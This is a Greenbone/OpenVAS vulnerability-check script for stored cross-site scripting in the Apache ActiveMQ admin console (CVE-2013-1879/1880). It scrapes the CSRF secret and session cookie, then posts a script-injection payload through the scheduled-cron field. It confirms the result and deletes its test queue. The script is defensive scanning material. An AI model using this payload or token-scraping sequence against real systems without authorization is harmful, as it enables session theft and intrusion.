CPE = "cpe:/a:apache:activemq";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803866" );
	script_version( "2020-04-29T07:58:44+0000" );
	script_cve_id( "CVE-2013-1879", "CVE-2013-1880" );
	script_bugtraq_id( 61142, 65615 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-04-29 07:58:44 +0000 (Wed, 29 Apr 2020)" );
	script_tag( name: "creation_date", value: "2013-08-13 14:52:49 +0530 (Tue, 13 Aug 2013)" );
	script_name( "Apache ActiveMQ < 5.9.0 Multiple Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_apache_activemq_consolidation.sc" );
	script_require_ports( "Services/www", 8161 );
	script_mandatory_keys( "apache/activemq/detected" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/54073" );
	script_xref( name: "URL", value: "https://issues.apache.org/jira/browse/AMQ-4397" );
	script_xref( name: "URL", value: "https://issues.apache.org/jira/browse/AMQ-4398" );
	script_tag( name: "summary", value: "This host is installed with Apache ActiveMQ and is prone to multiple
  cross site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a Crafted HTTP POST request and check whether it is able to read the
  cookie or not." );
	script_tag( name: "solution", value: "Upgrade to version 5.9.0 or later." );
	script_tag( name: "insight", value: "Multiple flaws exist due to:

  - an improper validation of the command in a user crontab file upon processing by the scheduled.jsp script

  - the Portfolio publisher servlet in the demo web application allows remote attackers to inject arbitrary web
  script or HTML via the refresh parameter to demo/portfolioPublish" );
	script_tag( name: "affected", value: "Apache ActiveMQ 5.8.0 and prior" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
get_app_location( cpe: CPE, port: port, nofork: TRUE );
url = "/admin/send.jsp";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(res && IsMatchRegexp( res, "HTTP/1\\.[01] 200" ) && ContainsString( res, "Send Messages" )){
	host = http_host_name( port: port );
	secKey = eregmatch( string: res, pattern: "<input type=.hidden. name=.secret. value=.([a-z0-9\\-]+)" );
	if(!secKey[1]){
		exit( 0 );
	}
	cookie = eregmatch( pattern: "Set-Cookie: JSESSIONID=([0-9a-z]*);", string: res );
	if(!cookie[1]){
		exit( 0 );
	}
	url = "/admin/sendMessage.action";
	postData = NASLString( "secret=", secKey[1], "&JMSDestination=xss-test&", "JMSDestinationType=queue&JMSCorrelationID=&JM", "SReplyTo=&JMSPriority=&JMSType=&JMSTimeToLive", "=&JMSXGroupID=&JMSXGroupSeq=&AMQ_SCHEDULED_DE", "LAY=&AMQ_SCHEDULED_PERIOD=&AMQ_SCHEDULED_REPE", "AT=&AMQ_SCHEDULED_CRON=*+*+*+*+*%22%3E%3Cscri", "pt%3Ealert%28document.cookie%29%3C%2Fscript%3", "E&JMSMessageCount=1&JMSMessageCountHeader=JMS", "XMessageCounter&JMSText=" );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: JSESSIONID=", cookie[1], "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(res && IsMatchRegexp( res, "HTTP/1\\.[01] 302" ) && IsMatchRegexp( res, "Location:.*/admin/queues.jsp" )){
		url = "/admin/browse.jsp?JMSDestination=xss-test";
		for(i = 0;i < 3;i++){
			if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: "SCHEDULED_CRON" )){
				url = "/admin/queues.jsp";
				req = http_get( item: url, port: port );
				res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
				if(res && IsMatchRegexp( res, "HTTP/1\\.[01] 200" )){
					secKey = eregmatch( string: res, pattern: "<input type=.hidden. name=.secret. value=.([a-z0-9\\-]+)" );
					if(!secKey[1]){
						exit( 0 );
					}
					cookie = eregmatch( pattern: "Set-Cookie: JSESSIONID=([0-9a-z]*);", string: res );
					if(!cookie[1]){
						exit( 0 );
					}
					url = NASLString( "/admin/deleteDestination.action?JMSDestination=xss-test&JMSDestinationType=queue&secret=", secKey[1] );
					req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: JSESSIONID=", cookie[1], "\\r\\n\\r\\n" );
					res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
					if(res && IsMatchRegexp( res, "HTTP/1\\.[01] 302" ) && IsMatchRegexp( res, "Location:.*/admin/queues.jsp" ) && !ContainsString( res, "xss-test" )){
						security_message( port: port );
						exit( 0 );
					}
				}
			}
		}
	}
}
exit( 99 );

